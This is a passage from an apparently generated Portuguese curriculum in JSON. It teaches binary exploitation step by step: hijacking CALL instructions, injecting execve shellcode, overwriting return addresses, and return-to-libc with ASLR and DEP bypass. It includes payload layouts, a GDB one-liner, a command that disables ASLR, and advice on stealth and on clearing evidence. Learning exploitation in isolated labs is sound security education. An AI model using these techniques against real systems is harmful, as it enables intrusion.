                                    "Errar offsets (contar shadow space).",
                                    "Não ajustar por ADD RSP após CALL.",
                                    "Confundir registradores com pilha."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Funções Importadas via .plt (ELF) ou IAT (PE)",
                                  "subSteps": [
                                    "Em ELF: use readelf -r para .rela.plt, objdump -d .plt para ver JMP [RIP+offset].",
                                    "Rastreie .plt stubs para .got.plt entries resolvidas em runtime.",
                                    "Em PE: dumpbin /imports ou CFF Explorer para IAT, note CALL [IAT_entry].",
                                    "Compare com symbols: nm ou readelf -s para confirmar imports como printf.",
                                    "Pratique patching: modifique .plt para NOP e observe crash."
                                  ],
                                  "verification": "Em um ELF/PE, identifique 2 imports via .plt/IAT e trace o CALL até o stub.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "readelf/objdump para ELF",
                                    "dumpbin/CFF Explorer para PE",
                                    "Binários: hello world ELF/EXE com imports"
                                  ],
                                  "tips": [
                                    ".plt é lazy binding: primeiro CALL resolve via GOT.",
                                    "Em radare2: 'afl; iz~plt' lista plt."
                                  ],
                                  "learningObjective": "Detectar e analisar chamadas a funções externas importadas.",
                                  "commonMistakes": [
                                    "Confundir .plt com .got (plt chama got).",
                                    "Não notar binding lazy em ELF.",
                                    "Ignorar PE delay imports."
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int main() { char* s=\"Hello\"; printf(\"%s\\n\", s); }' em ELF x64. Desmonte main: trace PUSH \"%s\\n\", PUSH \"Hello\", SUB RSP para alinhar, CALL [plt.printf]. Calcule [RSP+8]=\"%s\\n\", [RSP+16]=\"Hello\"; confirme .plt.printf JMP [RIP+off] para GOT.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo de pilha em uma CALL com 3 params em x64.",
                                "Desmontar um binário e mapear todos params para 2 CALLs importadas.",
                                "Identificar desalinhamento intencional em um binário modificado.",
                                "Usar debugger para pausar em CALL e dump pilha corretamente.",
                                "Diferenciar .plt ELF vs IAT PE em exemplos reais.",
                                "Simular RET poisoning rastreando endereço de retorno na pilha."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento de parâmetros e offsets na pilha (100% correto).",
                                "Correta identificação de stubs .plt/IAT e seu linkage.",
                                "Demonstração de alinhamento e convenções ABI específicas.",
                                "Uso correto de ferramentas para desmontagem e inspeção.",
                                "Análise de erros comuns como shadow space ou lazy binding.",
                                "Clareza em diagramas ou explicações da pilha."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: registradores e memória stack.",
                                "Programação em C/Assembly: convenções de chamada ABI.",
                                "Análise de Malware: ROP chains explorando pilha de chamadas.",
                                "Debugging e Ferramentas: GDB/WinDbg para runtime analysis.",
                                "Compiladores: como GCC gera código para funções."
                              ],
                              "realWorldApplication": "Em engenharia reversa de binários maliciosos para mapear chamadas a APIs como CreateFile (detecção de persistência), análise de crashes por stack corruption em software legado, ou auditoria de firmware para identificar backdoors via imports suspeitos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.4.1.3"
                            ]
                          },
                          {
                            "id": "10.1.6.4.2.2",
                            "name": "Redirecionar CALL para endereço arbitrário",
                            "description": "Substituir o operando da CALL por um novo endereço (ex: shellcode em buffer overflow), ajustando proteção DEP/ASLR se necessário, e testando execução em ambiente controlado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Análise do Binário e Identificação da Instrução CALL",
                                  "subSteps": [
                                    "Carregue o binário em um disassembler como IDA Pro ou Ghidra.",
                                    "Navegue pelo código de fluxo de controle e localize instruções CALL específicas (ex: call eax ou call [endereço]).",
                                    "Anote o endereço da CALL e o operando atual (endereço de destino original).",
                                    "Identifique vulnerabilidades próximas, como buffers overflowáveis que permitam sobrescrita.",
                                    "Documente o contexto: registradores envolvidos e pilha no momento da CALL."
                                  ],
                                  "verification": "Screenshot ou export do disassembler mostrando a CALL anotada com endereço e operando.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Disassembler (IDA Pro/Ghidra), Binário vulnerável de teste"
                                  ],
                                  "tips": "Use breakpoints no debugger para observar execução dinâmica da CALL.",
                                  "learningObjective": "Compreender a estrutura de instruções CALL em assembly x86/x64.",
                                  "commonMistakes": [
                                    "Confundir CALL com JMP",
                                    "Ignorar CALLs indiretas (ex: call [reg] )",
                                    "Não mapear offsets corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparação do Endereço Alvo e Shellcode",
                                  "subSteps": [
                                    "Escreva ou obtenha shellcode simples (ex: spawnar shell via execve em Linux).",
                                    "Compile e extraia o shellcode usando msfvenom ou pwntools.",
                                    "Determine o endereço de injeção (ex: buffer overflow para posicionar shellcode).",
                                    "Codifique o shellcode para evitar bad chars (NOP sled se necessário).",
                                    "Calcule o novo operando: endereço absoluto ou relativo do shellcode."
                                  ],
                                  "verification": "Shellcode testado standalone em debugger (ex: spawna shell sem crash).",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "msfvenom, pwntools, Debugger (GDB/WinDbg)"
                                  ],
                                  "tips": "Use shellcode position-independent para facilitar testes.",
                                  "learningObjective": "Criar payloads executáveis compatíveis com o ambiente alvo.",
                                  "commonMistakes": [
                                    "Shellcode com null bytes",
                                    "Não alinhar endereço (stack alignment)",
                                    "Ignorar endianness"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Sobrescrita do Operando da CALL via Exploit",
                                  "subSteps": [
                                    "Configure input overflow para alcançar o operando da CALL (calcule offset exato).",
                                    "Construa payload: junk + endereço do shellcode (little-endian).",
                                    "Use Python para gerar payload automatizado (ex: struct.pack).",
                                    "Injete payload via stdin ou arquivo vulnerável.",
                                    "Execute e observe se CALL redireciona (breakpoint no novo endereço)."
                                  ],
                                  "verification": "CALL salta para endereço arbitrário; stack trace confirma redirecionamento.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Python, Binário vulnerável, Debugger"
                                  ],
                                  "tips": "Retorne ao main ou use ROP para manter controle pós-CALL.",
                                  "learningObjective": "Manipular operandos de instruções via memory corruption.",
                                  "commonMistakes": [
                                    "Offset incorreto no payload",
                                    "Sobrescrita excessiva causando crash imediato",
                                    "Não retornar EIP corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Bypass de Proteções DEP e ASLR",
                                  "subSteps": [
                                    "Desabilite ASLR temporariamente (setarch ou LD_PRELOAD) para leak de endereços.",
                                    "Para DEP/NX: Use ROP chain para chamar mprotect ou VirtualProtect (encontre gadgets).",
                                    "Construa ROP para desabilitar DEP e executar shellcode.",
                                    "Integre ROP ao payload: redirecione CALL para ROP head, que executa shellcode.",
                                    "Re-habilite proteções e use leaks (info leak via format string) para ASLR."
                                  ],
                                  "verification": "Exploit funciona com ASLR/DEP ativados; shellcode executa sem violação.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "ROPgadget, one_gadget, Binário com proteções"
                                  ],
                                  "tips": "Procure gadgets em libc ou binário (pop rdi; ret; etc.).",
                                  "learningObjective": "Aplicar mitigações modernas em exploits avançados.",
                                  "commonMistakes": [
                                    "Gadgets inválidos (bad chars)",
                                    "Ordem errada em ROP chain",
                                    "Leak insuficiente para ASLR"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Teste e Depuração em Ambiente Controlado",
                                  "subSteps": [
                                    "Configure VM isolada (ex: VulnHub ou custom Docker com proteções).",
                                    "Execute exploit múltiplas vezes, variando ASLR seeds.",
                                    "Use strace/wireshark para monitorar comportamento.",
                                    "Debug crashes: core dumps e gdb --args.",
                                    "Otimize payload para stealth (evite detecção básica)."
                                  ],
                                  "verification": "Exploit consistente (sucesso >90% das execuções); shell interativa.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "VMware/VirtualBox, GDB-Peda, Wireshark"
                                  ],
                                  "tips": "Automatize testes com scripts pwntools remote/local.",
                                  "learningObjective": "Validar exploits de forma segura e reprodutível.",
                                  "commonMistakes": [
                                    "Testar em ambiente não controlado",
                                    "Ignorar timing issues",
                                    "Não limpar evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário C vulnerável a stack overflow (ex: strcpy(buffer) seguido de call func), injete payload que sobrescreve operando da call func para endereço de shellcode em buffer, usando ROP para bypass DEP: payload = 'A'*offset + shellcode_addr + rop_chain (mprotect + shellcode). Execução spawna /bin/sh.",
                              "finalVerifications": [
                                "CALL redireciona para endereço arbitrário confirmado via debugger.",
                                "Shellcode executa sem crash, alcançando objetivo (ex: reverse shell).",
                                "Exploit funciona com ASLR/DEP ativados via bypass.",
                                "Payload stealth: não detectado por ASLR randomização múltipla.",
                                "Ambiente controlado mantém isolamento (sem escape da VM)."
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de offsets e endereços (erro <1 byte).",
                                "Sucesso do bypass de proteções (taxa >80%).",
                                "Qualidade do shellcode/ROP: mínimo tamanho, sem bad chars.",
                                "Documentação completa: diagramas de memória e fluxograma.",
                                "Segurança: testes apenas em ambiente isolado.",
                                "Otimização: exploit em <100 bytes quando possível."
                              ],
                              "crossCurricularConnections": [
                                "Assembly e Arquitetura de Computadores: compreensão de CALL/JMP.",
                                "Programação em C/Python: construção de exploits e payloads.",
                                "Sistemas Operacionais: memória, proteções (ASLR/DEP/Canaries).",
                                "Redes: integração com reverse shells e listeners.",
                                "Ética em Cibersegurança: uso responsável em pentests."
                              ],
                              "realWorldApplication": "Em penetration testing (ex: Metasploit modules), CTFs como pwn.college, análise de malwares que hijackam calls para C2, e desenvolvimento de defesas (WAF/EDR signatures contra redirecionamentos)."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.4.2.1"
                            ]
                          },
                          {
                            "id": "10.1.6.4.2.3",
                            "name": "Injetar chamadas para funções de sistema",
                            "description": "Modificar CALL para invocar syscalls como execve via int 0x80 (32-bit) ou syscall (64-bit), integrando com buffer overflow para execução de shellcodes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Syscalls e suas Invocações em Assembly",
                                  "subSteps": [
                                    "Estude a convenção de chamadas de sistema (syscall) em x86-64 usando instrução 'syscall' e em x32 usando 'int 0x80'.",
                                    "Identifique registradores necessários para execve: RAX=59 (x64) ou EAX=11 (x32), RDI=RDI/EDI para pathname, RSI/RSI para argv, RDX/RDX para envp.",
                                    "Compile e disassemble um programa C simples que chama execve para visualizar o código assembly gerado.",
                                    "Pratique modificando registradores manualmente em um debugger para invocar syscall.",
                                    "Compare diferenças entre 32-bit e 64-bit, focando em alinhamento de pilha e registradores."
                                  ],
                                  "verification": "Desassemble um binário e confirme que consegue identificar e explicar a sequência de syscall para execve.",
                                  "estimatedTime": "2 horas",
                                  "materials": "GDB ou Ghidra, NASM ou GCC, documentação kernel.org para syscalls",
                                  "tips": "Use 'strace' para rastrear syscalls reais durante execução de programas.",
                                  "learningObjective": "Dominar os registradores e instruções para invocar syscalls básicas como execve.",
                                  "commonMistakes": "Confundir números de syscall entre arquiteturas (11 vs 59); ignorar NULL terminators em argv/envp."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar e Identificar CALLs em Binários Vulneráveis",
                                  "subSteps": [
                                    "Carregue um binário vulnerável a buffer overflow em um disassembler como objdump ou Ghidra.",
                                    "Localize instruções CALL que invocam funções como 'system' ou funções user-space manipuláveis.",
                                    "Trace o fluxo de controle para encontrar pontos de overflow próximos a CALLs.",
                                    "Anote endereços de CALL e registradores envolvidos no contexto do overflow.",
                                    "Simule o fluxo no GDB para validar o caminho de execução."
                                  ],
                                  "verification": "Gere um relatório com endereços de CALLs e potenciais pontos de hijack identificados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Binário vulnerável (ex: clássico buffer overflow lab), Ghidra ou IDA Free, GDB",
                                  "tips": "Use breakpoints em CALLs para inspecionar stack e registradores em runtime.",
                                  "learningObjective": "Identificar oportunidades de manipulação de CALLs em binários via análise estática e dinâmica.",
                                  "commonMistakes": "Ignorar proteções como ASLR ou NX; não alinhar corretamente o RIP/RIP no overflow."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Shellcode com Syscall Injetada",
                                  "subSteps": [
                                    "Escreva shellcode assembly para preparar registradores e invocar syscall execve('/bin/sh').",
                                    "Use msfvenom ou escreva manualmente, garantindo nul-free (evite \\/x00).",
                                    "Modifique um CALL existente no shellcode para apontar para int 0x80/syscall.",
                                    "Teste o shellcode standalone com um loader simples.",
                                    "Otimize para caber em buffer overflow, calculando padding necessário."
                                  ],
                                  "verification": "Execute shellcode isolado e confirme spawn de shell interativa.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "NASM, Python para loader de shellcode, msfvenom",
                                  "tips": "Inclua 'xor rax,rax' para zerar registradores e evitar bytes nulos.",
                                  "learningObjective": "Construir shellcode que injeta e executa syscalls diretamente.",
                                  "commonMistakes": "Bytes nulos em strings; desalinhamento de stack pointer."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Shellcode via Buffer Overflow e Hijack de CALL",
                                  "subSteps": [
                                    "Calcule offset exato do buffer overflow usando cyclic patterns (ex: pwntools).",
                                    "Construa payload: padding + endereço de CALL modificado + shellcode com syscall.",
                                    "Overwrite o retorno ou hijack CALL para apontar para shellcode.",
                                    "Execute em ambiente desabilitado (ASLR=off, NX=off) e capture flag/shell.",
                                    "Itere depurando falhas com GDB."
                                  ],
                                  "verification": "Payload resulta em execução de shell via syscall injetada.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Pwntools ou Python, binário vulnerável, GDB-Peda",
                                  "tips": "Use 'ret2syscall' se possível para ROP chains simples.",
                                  "learningObjective": "Explorar buffer overflow para redirecionar CALLs a syscalls customizadas.",
                                  "commonMistakes": "Offset incorreto; não considerar endianness em endereços."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Mitigar em Cenários Avançados",
                                  "subSteps": [
                                    "Habilite ASLR e teste com leak de endereços via format string ou info leak.",
                                    "Adicione bypass NX com ROP para execve syscall.",
                                    "Analise detecção por antivirus ou EDR simulados.",
                                    "Documente mitigações como stack canaries e relocatable code.",
                                    "Crie PoC para relatório de vulnerabilidade."
                                  ],
                                  "verification": "Exploit funciona com proteções parciais ativadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Checksec para análise de proteções, ROPgadget",
                                  "tips": "Pratique em VMs isoladas como VulnHub ou OverTheWire.",
                                  "learningObjective": "Aplicar técnicas em ambientes realistas com mitigações.",
                                  "commonMistakes": "Subestimar leaks necessários para ASLR."
                                }
                              ],
                              "practicalExample": "Em um binário C vulnerável com strcpy sem bounds, identifique CALL para 'puts' em 0x401000. Calcule offset 112, payload: 'A'*112 + addr_shellcode + shellcode que modifica CALL para syscall execve('/bin/sh', NULL, NULL), resultando em shell ao inputar payload via netcat.",
                              "finalVerifications": [
                                "Shellcode spawna /bin/sh interativo sem crashes.",
                                "GDB confirma syscall 59 (execve) invocada com parâmetros corretos.",
                                "Exploit roda consistentemente em 10 tentativas.",
                                "Análise estática mostra hijack de CALL bem-sucedido.",
                                "PoC inclui bypass básico de ASLR via leak.",
                                "Nenhum byte nulo ou caracteres ruins no payload."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de registradores e números de syscall (90%+).",
                                "Shellcode funcional e otimizado (<100 bytes).",
                                "Exploit bem-sucedido em binário com overflow simples.",
                                "Relatório detalhado com screenshots de GDB e disassembly.",
                                "Demonstração de bypass de pelo menos uma proteção (ASLR/NX).",
                                "Código limpo, comentado e reproduzível."
                              ],
                              "crossCurricularConnections": [
                                "Assembly e Arquitetura de Computadores: Registradores e instruções de interrupção.",
                                "Sistemas Operacionais: Syscalls e modelo de privilégios kernel/user.",
                                "Programação em C: Vulnerabilidades de buffer e gerenciamento de memória.",
                                "Redes e Pentesting: Exploits remotos via netcat/socat.",
                                "Criptografia: Opcional para ofuscação de shellcode."
                              ],
                              "realWorldApplication": "Em pentests éticos (ex: CTFs, bug bounties), análise de malware reverso para detectar injeções de syscall em ransomwares, ou desenvolvimento de defesas como W^X policies e seccomp filters em aplicações críticas."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.4.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.4.3",
                        "name": "Controle de Retornos (RET)",
                        "description": "Instruções RET que pop o endereço de retorno da pilha para o IP/RIP, vulneráveis a manipulações via stack overflow para return-oriented programming (ROP).",
                        "specificSkills": [
                          {
                            "id": "10.1.6.4.3.1",
                            "name": "Identificar e manipular valores na pilha de retorno",
                            "description": "Usar debugger para inspecionar stack frames durante RET, overflow buffers para sobrescrever endereço de retorno com gadgets ou funções como system().",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura da pilha de retorno e stack frames",
                                  "subSteps": [
                                    "Estude o funcionamento da pilha em chamadas de função em assembly x86/x64.",
                                    "Identifique componentes de um stack frame: parâmetros, registradores salvos, endereço de retorno e frame pointer.",
                                    "Compile e execute um programa C simples com funções aninhadas para observar a pilha.",
                                    "Use objdump ou readelf para analisar o binário e mapear endereços de funções.",
                                    "Desenhe um diagrama da pilha antes e após uma instrução RET."
                                  ],
                                  "verification": "Desenhe corretamente um stack frame com endereço de retorno destacado e explique seu papel.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Compilador GCC, objdump/readelf, editor de texto, papel/caneta para diagramas",
                                  "tips": "Use flags -fno-stack-protector -z execstack ao compilar para desabilitar proteções iniciais.",
                                  "learningObjective": "Entender como endereços de retorno são armazenados e recuperados na pilha.",
                                  "commonMistakes": "Confundir endereço de retorno com frame pointer ou parâmetros da função."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e usar debugger para inspecionar stack frames durante RET",
                                  "subSteps": [
                                    "Instale e configure GDB com extensões como PEDA ou Pwntools para visualização da pilha.",
                                    "Compile um binário C vulnerável com buffer local e execute no GDB.",
                                    "Defina breakpoints na instrução RET (ex: break *main+offset) e use 'info registers' e 'x/20x $rsp'.",
                                    "Examine a pilha com 'x/10gx $rsp' para localizar o endereço de retorno acima do buffer.",
                                    "Passo a passo: entre na função, preencha buffer, avance até RET e observe mudanças."
                                  ],
                                  "verification": "Capture screenshot ou log mostrando stack frame com endereço de retorno visível durante RET.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "GDB, PEDA/Gef/Pwndbg, binário C vulnerável (ex: strcpy sem bounds check)",
                                  "tips": "Use 'tui enable' no GDB para visualização assembly + registradores simultânea.",
                                  "learningObjective": "Dominar inspeção dinâmica da pilha para identificar valores de retorno.",
                                  "commonMistakes": "Não alinhar corretamente o stack pointer ou ignorar canary se presente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar endereço de retorno e explorar overflow de buffer",
                                  "subSteps": [
                                    "Meça o offset exato do buffer até o endereço de retorno usando cyclic patterns (ex: gdb-peda$_).",
                                    "Preencha o buffer com dados controlados e observe sobrescrita no debugger.",
                                    "Extraia endereço de uma função/gadget desejada com 'p &system' ou ROPgadget.",
                                    "Teste overflow controlado: sobrescreva retorno com endereço conhecido sem crash.",
                                    "Verifique com 'r < input' e breakpoint para confirmar sobrescrita."
                                  ],
                                  "verification": "Demonstre overflow preciso alterando retorno para loop infinito ou label benigno.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "GDB com plugins, ROPgadget/objdump, Python para gerar payloads",
                                  "tips": "Comece com ASLR desabilitado (echo 0 > /proc/sys/kernel/randomize_va_space).",
                                  "learningObjective": "Calcular e explorar offsets para manipular precisamente o endereço de retorno.",
                                  "commonMistakes": "Offset incorreto levando a segfaults; esquecer alinhamento de stack (8 bytes em x64)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Manipular pilha de retorno com gadgets ou funções como system()",
                                  "subSteps": [
                                    "Gere ROP chain simples: ret2system com arg '/bin/sh' na pilha.",
                                    "Use msfvenom ou rp++ para encontrar gadgets POP RDI; RET.",
                                    "Construa payload: junk + offset + pop_rdi + &system + &sh.",
                                    "Execute exploit em ambiente controlado e capture shell.",
                                    "Analise com GDB: confirme execução do gadget e chamada system()."
                                  ],
                                  "verification": "Obtenha shell interativa ou saída de comando confirmando controle de fluxo alterado.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "GDB, ROPgadget/rp-lin-x64, Python, binário vulnerável sem proteções",
                                  "tips": "Teste em VM isolada; use one_gadgets para chains mais simples.",
                                  "learningObjective": "Aplicar manipulação prática para redirecionar fluxo via ROP ou ret2libc.",
                                  "commonMistakes": "Argumentos errados para system(); gadgets inválidos devido a NX/PIE."
                                }
                              ],
                              "practicalExample": "Em um binário C com strcpy(buffer), envie payload de 100 bytes junk + endereço de system() + endereço de '/bin/sh' na pilha. No GDB: (gdb) r $(python -c 'print \"A\"*offset + p64(system_addr) + p64(sh_addr)') resulta em shell ao hit RET.",
                              "finalVerifications": [
                                "Explicar diagrama de stack frame com RET destacado.",
                                "Identificar offset buffer-to-RET em novo binário via debugger.",
                                "Sobrescrever RET para chamar função conhecida sem crash.",
                                "Construir ROP chain de 3 gadgets para executar system('/bin/sh').",
                                "Documentar passos com screenshots de GDB stack dumps.",
                                "Discutir impactos de ASLR/ Canary em manipulação."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de endereços de retorno (100% offset correto).",
                                "Sucesso em overflow controlado sem segfaults (3/3 tentativas).",
                                "Construção funcional de ROP chain para shell (demo ao vivo).",
                                "Explicação clara de stack frames e instrução RET.",
                                "Análise de erros comuns e mitigações (ASLR, NX).",
                                "Documentação completa com diagramas e logs."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender chamadas de função e pilha.",
                                "Sistemas Operacionais: Gerenciamento de memória e proteções (ASLR, Canary).",
                                "Matemática: Cálculos de offsets e alinhamento binário.",
                                "Redes: Exploração em exploits remotos (ex: buffer overflow em servers)."
                              ],
                              "realWorldApplication": "Desenvolvimento de exploits em CTFs/pentesters éticos, análise de vulnerabilidades em binários reais (ex: CVE buffer overflows), bypass de proteções em reverse engineering para auditorias de segurança."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.4.2.3"
                            ]
                          },
                          {
                            "id": "10.1.6.4.3.2",
                            "name": "Implementar redirecionamento via return-to-libc",
                            "description": "Sobrescrever RET com endereço de libc functions (ex: system('/bin/sh')), resolvendo ASLR com leaks ou gadgets, em binários ELF/PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente de teste e binário vulnerável",
                                  "subSteps": [
                                    "Compile um binário ELF vulnerável a buffer overflow usando gcc sem proteções (ex: gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln).",
                                    "Instale ferramentas: GDB com pwndbg, checksec, libc-database, ROPgadget.",
                                    "Execute checksec para confirmar ausência de ASLR parcial, NX, etc., no binário.",
                                    "Identifique o buffer overflow ponto usando gdb (ex: cyclic pattern com pwntools para encontrar offset).",
                                    "Desabilite ASLR temporariamente com echo 0 > /proc/sys/kernel/randomize_va_space para testes iniciais."
                                  ],
                                  "verification": "Confirme offset exato via crash em GDB e checksec mostra vulnerabilidades adequadas.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "GCC compiler",
                                    "GDB + pwndbg",
                                    "pwntools",
                                    "checksec",
                                    "cyclic pattern generator"
                                  ],
                                  "tips": [
                                    "Use pwndbg para visualização melhorada; teste em VM isolada para segurança."
                                  ],
                                  "learningObjective": "Preparar um ambiente controlado para exploração de return-to-libc.",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar proteções como stack canary",
                                    "Não isolar ambiente de teste",
                                    "Usar ASLR ativado sem leak planejado"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar binário e mapear funções da libc",
                                  "subSteps": [
                                    "Carregue o binário no GDB e use info proc mappings para ver libc carregada.",
                                    "Encontre offset de system e '/bin/sh' na libc usando one_gadgets ou strings/ROPgadget.",
                                    "Extraia a versão da libc com ldd ou gdb info proc mappings e busque em libc-database.",
                                    "Calcule endereços relativos: system_offset = endereço_system - libc_base.",
                                    "Planeje leak de libc base via printf ou similar se ASLR estiver ativo."
                                  ],
                                  "verification": "Registre offsets precisos de system e '/bin/sh' para payload.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "GDB/pwndbg",
                                    "ROPgadget",
                                    "libc-database",
                                    "strings utility"
                                  ],
                                  "tips": [
                                    "Use 'vmmap' em pwndbg para mappings rápidos; priorize offsets estáveis entre versões de libc."
                                  ],
                                  "learningObjective": "Mapear dependências de libc para bypass ASLR parcial.",
                                  "commonMistakes": [
                                    "Confundir offsets de diferentes versões de libc",
                                    "Ignorar alinhamento de stack (8 bytes)",
                                    "Não verificar got.plt para leaks"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver leak de endereço libc se ASLR ativo",
                                  "subSteps": [
                                    "Implemente overflow para leakar endereço de função GOT (ex: printf@GOT via format string ou overflow parcial).",
                                    "Subtraia offset conhecido para calcular libc_base (ex: leak_puts - puts_offset).",
                                    "Crie script Python com pwntools para automatizar envio de payload leak e cálculo.",
                                    "Teste leak em GDB: envie payload, pause e verifique valor leaked.",
                                    "Re-habilite ASLR e confirme leak funciona dinamicamente."
                                  ],
                                  "verification": "Obtenha libc_base correto consistentemente em múltiplas execuções.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "pwntools Python library",
                                    "GDB",
                                    "Binário vuln com leak possível (ex: printf)"
                                  ],
                                  "tips": [
                                    "Use %p em format strings para leaks; armazene leak em variável para uso posterior."
                                  ],
                                  "learningObjective": "Implementar info leak para resolver ASLR em exploits reais.",
                                  "commonMistakes": [
                                    "Leak incorreto devido a null bytes no payload",
                                    "Não alinhar stack após leak",
                                    "Assumir ASLR desabilitado permanentemente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir e executar payload return-to-libc",
                                  "subSteps": [
                                    "Calcule payload: padding + RET (libc_base + system_offset) + dummy + (libc_base + binsh_offset).",
                                    "Use pwntools para gerar payload: p64(pop_rdi) se necessário + p64(binsh) + p64(system).",
                                    "Envie payload via stdin ou socket, capture output para shell.",
                                    "Teste em GDB passo-a-passo: defuse, examine stack após overflow.",
                                    "Automatize full exploit com processo remoto/local e verifique spawn de shell."
                                  ],
                                  "verification": "Obtenha shell interativa ($? = 0 após exit).",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "pwntools",
                                    "GDB",
                                    "Netcat para teste remoto"
                                  ],
                                  "tips": [
                                    "Garanta 8-byte alignment; use ROP chain mínima para pop rdi ret."
                                  ],
                                  "learningObjective": "Executar redirecionamento de controle para shell via libc.",
                                  "commonMistakes": [
                                    "Endereços errados devido a ASLR não leakado",
                                    "Falta de alinhamento stack",
                                    "Argumento '/bin/sh' não no formato correto"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e mitigar em binários PE (Windows)",
                                  "subSteps": [
                                    "Adapte para PE: use Immunity Debugger ou x64dbg para análise.",
                                    "Encontre VirtualAlloc/VirtualProtect em kernel32.dll via offsets ou pattern scan.",
                                    "Construa payload similar: RET -> VirtualProtect + args para shellcode.",
                                    "Teste bypass ASLR com leak de PEB ou module base.",
                                    "Compare ELF vs PE: note diferenças em calling convention (stdcall).",
                                    "Documente adaptações em script pwntools para Windows."
                                  ],
                                  "verification": "Shell spawn em ambiente Windows sem crashes.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Immunity Debugger",
                                    "x64dbg",
                                    "pwntools (Windows target)",
                                    "Binário PE vuln"
                                  ],
                                  "tips": [
                                    "Use ROP para chamar LoadLibrary se necessário; teste em Wine para cross-plat."
                                  ],
                                  "learningObjective": "Estender técnica para binários PE, entendendo diferenças arquiteturais.",
                                  "commonMistakes": [
                                    "Ignorar calling conventions diferentes",
                                    "Offsets kernel32 errados",
                                    "Não lidar com DEP via VirtualProtect"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ELF com gets() vulnerável: offset=112 bytes. Leak libc_base via puts(puts_got). Payload: padding(112) + pop_rdi_ret + binsh_addr + system_addr. Execução: python3 -c 'print(open(\"payload\",\"rb\").read())' | ./vuln → $ whoami",
                              "finalVerifications": [
                                "Exploit spawna shell interativa em binário com ASLR ativado.",
                                "Offsets de libc calculados corretamente via leak.",
                                "Payload funciona em GDB e remotamente.",
                                "Adaptação básica para PE demonstrada.",
                                "checksec confirma bypass de proteções relevantes.",
                                "Script pwntools automatizado e reutilizável."
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de endereços e leak (sem crashes).",
                                "Estrutura correta do payload (alinhamento, ROP mínima).",
                                "Automação via script funcional em ASLR on.",
                                "Explicação clara de steps e adaptações PE.",
                                "Identificação de erros comuns evitados.",
                                "Aplicação em exemplo real sem orientação."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender stack frames e calling conventions.",
                                "Sistemas Operacionais: Módulos carregados, ASLR, mmap.",
                                "Engenharia Reversa: Ferramentas como GDB, ROPgadget.",
                                "Redes/Segurança: Exploits remotos via pwntools sockets.",
                                "Algoritmos: Pattern matching para offsets."
                              ],
                              "realWorldApplication": "Usado em CTFs (pwn challenges) e exploits históricos como contra serviços web vulneráveis (ex: buffer overflow em daemons); base para ROP chains avançadas em bypass de NX/DEP."
                            },
                            "estimatedTime": "2 horas",
